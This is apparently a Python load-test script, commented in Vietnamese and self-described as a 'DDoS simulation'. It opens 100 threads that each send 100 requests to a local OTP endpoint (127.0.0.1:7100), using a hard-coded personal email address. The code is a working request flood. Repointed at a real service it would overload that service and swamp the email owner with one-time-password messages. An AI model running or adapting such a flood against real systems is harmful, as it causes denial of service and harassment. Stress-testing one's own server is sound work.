import requests
import threading

from src.Header import headers
import time

TARGET_URL = "http://127.0.0.1:7100/api/otp"  # Thay đổi port nếu server mi chạy trên cổng khác
NUM_THREADS = 100  # Số luồng tấn công cùng lúc
REQUESTS_PER_THREAD = 100  # Số request mỗi thread gửi


# Hàm gửi request liên tục
def attack():
    data = {
        "email": "truongvanminhxom14ql@gmail.com",
        "name": "Minh"
    }


    for _ in range(REQUESTS_PER_THREAD):
        try:
            response = requests.get(TARGET_URL, json=data, headers=headers, timeout=2)
            print(f"Response: {response.status_code} + {response.text}")
        except requests.exceptions.RequestException as e:
            print(f"Request error: {e}")


# Tạo nhiều thread để mô phỏng DDoS
threads = []
for _ in range(NUM_THREADS):
    thread = threading.Thread(target=attack)
    thread.start()
    threads.append(thread)


# Chờ tất cả các thread kết thúc
for thread in threads:
    thread.join()

print("🔥 DDoS simulation completed 🔥")
